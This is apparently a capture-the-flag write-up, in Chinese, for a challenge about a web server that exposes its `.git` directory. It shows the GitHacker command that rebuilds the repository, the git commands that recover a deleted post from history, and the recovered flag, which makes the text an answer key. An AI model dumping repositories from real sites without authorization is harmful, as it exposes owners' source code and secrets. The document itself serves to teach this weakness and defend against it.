# repo_leak

## 题目简述

站点公告中的 “Using Git for version control” 提示服务器公开了项目的 `.git` 元数据。当前页面已经删除 flag，但 Git 对象和提交记录仍可用于还原历史版本。

## 解题过程

先确认 `/.git/HEAD`、`/.git/config` 等路径可访问，再使用 GitHacker 一类工具重建仓库；`http://target/` 替换为实际题目地址：

```bash
githacker --url http://target/ --output-folder repo
cd repo
git log --all --oneline
```

提交历史中可以定位到信息为 `add post: flag` 的旧提交：

```text
8a5b670558921bd232d75b29542492f00698298b add post: flag
```

无需修改工作树，直接查看目标提交中的文件即可：

```bash
git show 8a5b670558921bd232d75b29542492f00698298b:content/posts/flag.md
```

若路径未知，可先使用 `git ls-tree -r --name-only <commit>` 枚举该提交的文件，或用 `git log --all -- content/posts/` 缩小范围。恢复出的历史页面包含：

```text
0xGame{3fc49725-23b5-4f28-8c64-16a3459b67b7}
```

## 方法总结

`.git` 泄露不仅暴露当前源码，还可能暴露已删除文件、历史密钥和提交信息。恢复后应同时检查分支、标签与悬空对象。取证时优先使用 `git show`、`git ls-tree` 等只读命令，避免用 `git reset --hard` 不必要地改变恢复现场。
